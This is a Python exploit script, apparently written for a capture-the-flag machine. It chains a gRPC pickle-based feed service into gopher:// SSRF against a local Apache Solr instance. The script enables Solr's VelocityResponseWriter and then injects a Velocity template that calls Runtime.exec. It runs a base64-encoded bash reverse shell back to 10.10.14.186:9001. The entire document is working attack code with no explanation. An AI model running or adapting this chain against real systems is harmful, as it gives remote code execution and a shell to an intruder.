import sys
import base64
import pickle
import subprocess

payload = 'bash -c {echo,' + base64.b64encode("bash -i >& /dev/tcp/10.10.14.186/9001 0>&1").replace('+','%2b') + '}|{base64,-d}|{bash,-i}'

def send_url(url):
    feed_url = '{"feed_url": "gopher://localhost:8983/ ' + url + '"}'     
    print(feed_url)
    feed_b64 = base64.b64encode((pickle.dumps(feed_url)).encode('utf-8'))

    cmd = '/opt/grpccurl/grpcurl -max-time 5 -plaintext -proto laser.proto -d \'{"data":"' + feed_b64 + '"}\' 10.10.10.201:9000 Print.Feed'
    subprocess.call(cmd, shell=True)


def encode_data(data):
    return str(data.replace('%','%25').replace('\n','%0d%0a').replace('"', '\\"'))


def get_url(header, req):
    send_url(encode_data(req) + encode_data(header))        

def post_url(header, body):
    send_url(encode_data(header) + "%0d%0a%0d%0a" + encode_data(body))

# POST REQ

body = """
{
    "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
    }
}""".strip().replace('\n','').replace(' ', '')


header = """
POST /solr/staging/config HTTP/1.1
Host: localhost:8983
Content-Type: application/json
Content-Length: {}""".format(len(body)).strip()

post_url(header, body)

# GET REQ

header = ' HTTP/1.1\nHost: localhost:8983\n'
template = '%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec("PAYLOAD"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
req = 'GET /solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=' + template.replace("PAYLOAD", payload).replace(' ','%20')

get_url(header, req)